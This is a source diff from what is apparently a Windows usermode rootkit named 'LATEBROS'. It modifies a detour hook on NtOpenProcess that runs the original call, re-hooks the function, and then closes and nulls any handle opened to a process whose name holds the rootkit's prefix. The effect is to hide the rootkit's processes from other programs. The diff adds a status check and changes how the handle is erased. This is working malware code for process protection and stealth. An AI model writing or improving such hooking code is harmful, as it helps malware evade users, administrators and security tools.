@@ -19,10 +19,13 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 	detour::remove_detour(function_pointer, ntop_og, sizeof(ntop_og));
 
 	// CALL
-	reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);
+	const auto status = reinterpret_cast<NtOpenProcess_t>(function_pointer)(out_handle, MAXIMUM_ALLOWED, object_attributes, client_id);
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntop));
+
+	if (!NT_SUCCESS(status))
+		return status;
 
 	std::wstring name_buffer;
 	name_buffer.resize(MAX_PATH);
@@ -33,11 +36,8 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntop(PHANDLE out_handle, ACCESS_
 		// 'INFECTED' PROCESS IS TRYING TO OPEN A HANDLE TO A LATEBROS PROCESS
 		if (name_buffer.find(ROOTKIT_PREFIX) != std::wstring::npos)
 		{
-			if(*out_handle)
-				CloseHandle(*out_handle);		// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
-
-			// INVALID_HANDLE_VALUE shouldn't cause problems with CloseHandle
-			*out_handle = INVALID_HANDLE_VALUE;	// ERASE PASSED HANLDE
+			CloseHandle(*out_handle);			// CLOSE HANDLE TO ENSURE IT WON'T BE USED REGARDLESS OF SANITY CHECKS
+			*out_handle = nullptr;				// ERASE PASSED HANLDE
 			return ERROR_INVALID_PARAMETER;		// RETURN INVALID CLIENT_ID
 		}
 	}
